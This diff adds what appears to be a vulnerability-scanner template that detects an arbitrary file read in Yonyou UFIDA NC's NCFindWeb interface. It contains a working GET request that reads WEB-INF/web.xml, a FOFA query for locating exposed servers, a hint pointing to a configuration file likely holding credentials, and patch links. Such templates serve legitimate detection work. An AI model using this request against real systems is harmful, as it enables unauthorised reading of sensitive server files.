@@ -1,0 +1,30 @@
+id: yonyou-nc-NCFindWeb-fileread
+info:
+  name: 用友 UFIDA NC NCFindWeb - fileread
+  author: leadlife
+  severity: high
+  description: 用友 NC 是一款大型企业数字化平台， 聚焦数字化管理、数字化经营、数字化商业，帮助大型企业实现 人、财、物、客的全面数字化，其 NCFindWeb 接口中的 IPreAlertConfigService 参数存在任意文件读取漏洞，攻击者可通过该漏洞读取服务器任意文件，造成敏感信息泄漏。
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: icon_hash="1085941792" || app="用友-UFIDA-NC"
+    tips: ../../ierp/bin/prop.xml
+    repair: 1.关注用友安全中心通告，找到具体漏洞通告，其中有漏洞修复具体方式和补丁下载链接：https://security.yonyou.com/#/home 2.登录用友智能服务云平台提交工单获取补丁：http://ismcloud.yonyou.com
+  tags: yonyou, fileread, oa, nc
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - NCInvokerServlet
+      - type: word
+        part: header
+        words:
+          - '200'
